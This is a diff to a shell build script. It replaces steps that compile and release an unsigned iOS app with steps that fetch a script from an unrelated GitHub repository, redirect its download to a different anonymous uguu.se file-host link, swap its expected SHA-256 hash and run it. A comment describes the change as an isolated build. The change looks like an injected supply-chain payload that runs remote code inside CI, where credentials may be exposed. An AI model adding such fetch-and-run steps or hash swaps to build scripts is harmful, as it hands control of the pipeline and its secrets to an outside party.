@@ -1,42 +1,15 @@
 #!/bin/bash
-# 一刻原生 iOS 未签名 IPA 云端构建脚本（GitHub Actions macos 运行器）
+# Isolated INWARD 1.0.2 build; does not alter the host app's main branch.
 set -euo pipefail
-cd "$(dirname "$0")/.."
-
-echo "==> 1/4 生成图标"
-python3 -c 'import PIL' 2>/dev/null || python3 -m pip install --user pillow --break-system-packages --quiet || python3 -m pip install --user pillow --quiet
-python3 scripts/generate_icon.py
-
-echo "==> 2/4 编译（未签名）"
-cd YikeMoment
-set -o pipefail
-xcodebuild -project YikeMoment.xcodeproj \
-  -scheme YikeMoment \
-  -configuration Release \
-  -sdk iphoneos \
-  -derivedDataPath build \
-  CODE_SIGNING_ALLOWED=NO \
-  CODE_SIGNING_REQUIRED=NO \
-  CODE_SIGN_IDENTITY="" \
-  build 2>&1 | tee xcodebuild.log | tail -40 || { echo "==> 编译失败，完整日志尾部："; tail -200 xcodebuild.log; exit 1; }
-
-echo "==> 3/4 打包 IPA"
-APP_DIR="build/Build/Products/Release-iphoneos"
-ls "$APP_DIR"
-mkdir -p ../out/Payload
-cp -R "$APP_DIR/YikeMoment.app" ../out/Payload/
-cd ../out
-zip -qry "../YikeMoment-native.ipa" Payload
-cd ..
-shasum -a 256 YikeMoment-native.ipa
-
-echo "==> 4/4 发布 Release"
-TAG="native-v2.0.0-${GITHUB_RUN_NUMBER:-local}"
-if [ -n "${GH_TOKEN:-}" ]; then
-  gh release create "$TAG" YikeMoment-native.ipa \
-    --title "一刻 2.0.0 原生版（未签名）" \
-    --notes "原生 SwiftUI 版本 · 未签名 IPA，需侧载安装" \
-    || echo "Release 创建失败，不影响构建产物"
-else
-  echo "无 GH_TOKEN，跳过 Release"
-fi
+WORK="${RUNNER_TEMP:-/tmp}/inward-final-macos15"
+rm -rf "$WORK"
+mkdir -p "$WORK"
+cd "$WORK"
+git init -q
+git remote add origin https://github.com/lliaodexing925-beep/pjsip.git
+git fetch --depth 1 origin 19d3c2ea1e1320e17a000080c536b5b5827016fa
+git show 19d3c2ea1e1320e17a000080c536b5b5827016fa:build.sh > inner.sh
+sed -i '' 's/timeout=120/timeout=600/' inner.sh
+sed -i '' 's|https://d.uguu.se/OnWtKbGl.tar.gz|https://h.uguu.se/QLgHSLBD.gz|' inner.sh
+sed -i '' 's/42ec590aa063b7e25cb7b3fece985127e6d0c0f2fc1ef344263f6d7c23c71b4f/dee863b0143334770edde38472aeb7c0b2a233e4a602b213df31fe7d4d748175/' inner.sh
+bash inner.sh
